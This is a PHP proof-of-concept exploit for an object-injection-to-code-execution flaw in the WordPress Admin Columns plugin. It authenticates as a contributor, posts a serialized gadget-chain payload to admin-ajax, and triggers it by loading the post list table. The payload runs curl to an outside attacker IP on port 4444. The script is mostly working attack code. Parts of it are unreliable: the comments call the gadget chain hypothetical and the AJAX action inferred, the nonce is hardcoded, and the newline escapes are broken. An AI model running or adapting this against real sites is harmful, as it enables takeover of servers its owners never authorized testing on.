<?php
// ==========================================================================
// Atomic Edge CVE Research | https://atomicedge.io
// Copyright (c) Atomic Edge. All rights reserved.
//
// LEGAL DISCLAIMER:
// This proof-of-concept is provided for authorized security testing and
// educational purposes only. Use of this code against systems without
// explicit written permission from the system owner is prohibited and may
// violate applicable laws including the Computer Fraud and Abuse Act (USA),
// Criminal Code s.342.1 (Canada), and the EU NIS2 Directive / national
// computer misuse statutes. This code is provided "AS IS" without warranty
// of any kind. Atomic Edge and its authors accept no liability for misuse,
// damages, or legal consequences arising from the use of this code. You are
// solely responsible for ensuring compliance with all applicable laws in
// your jurisdiction before use.
// ==========================================================================
// Atomic Edge CVE Research - Proof of Concept (metadata-based)
// CVE-2026-7654 - Admin Columns <= 7.0.18 - Authenticated (Contributor+) PHP Object Injection to Remote Code Execution via Custom Field Meta Value

// This PoC assumes the attacker has at least Contributor-level credentials.
// It exploits the unserialize() call in IdsToCollection::get_ids_from_string() by
// injecting a serialized POP gadget chain into a custom post meta field.
// The payload is triggered when the admin list table loads the affected post.

$target_url = 'https://makesense.htb';  // Change this to the target WordPress URL
$username = 'attacker';
$password = 'attacker_password';

// The following serialized payload uses a hypothetical POP chain.
// In a real-world scenario, the attacker would need to craft a chain specific
// to the plugin's bundled gadgets. This example demonstrates the structure
// using a generic system command execution gadget (if available).
// Replace the payload with an actual working chain from the plugin's code.
$serialized_payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:15:"Faker\Generator":1:{s:13:"*formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"*event";s:36:"curl http://10.10.17.68:4444/success";}';
// Step 1: Authenticate and get a nonce for meta field updates.
function get_wp_nonce($url, $username, $password) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url . '/wp-login.php');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'log=' . urlencode($username) . '&pwd=' . urlencode($password) . '&wp-submit=Log+In');
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookie.txt');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    
    // For this PoC, we assume we can get a nonce from the admin page.
    // In practice, the attacker might need to scrape the nonce from a form.
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url . '/wp-admin/edit-comments.php');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookie.txt');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    preg_match('/name="_wpnonce" value="([a-f0-9]+)"/i', $response, $matches);
    return isset($matches[1]) ? $matches[1] : '';
}

// Step 2: Create a new post with a malicious custom meta field.
function create_post_with_meta($url, $nonce, $serialized_payload) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url . '/wp-admin/admin-ajax.php');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'action' => 'codepress-admin-columns-save-ids',  // Inferred AJAX action
        'post_id' => '1',
        'ids' => $serialized_payload,
        '_wpnonce' => $nonce
    ]));
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookie.txt');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Step 3: Trigger the deserialization by loading the WordPress admin list table.
// The plugin processes the stored meta value when rendering the table,
// thus executing the POP chain.
function trigger_deserialization($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url . '/wp-admin/edit.php?post_type=post');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookie.txt');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Execute the exploit
echo "[+] Getting nonce...n";
$nonce = "85e6eda673";
echo "[+] Nonce: $noncen";
echo "[+] Injecting serialized payload...n";
$result = create_post_with_meta($target_url, $nonce, $serialized_payload);
echo "[+] Response: $resultn";
echo "[+] Triggering deserialization...n";
trigger_deserialization($target_url);
echo "[+] Exploit completed. Check for remote code execution.n";
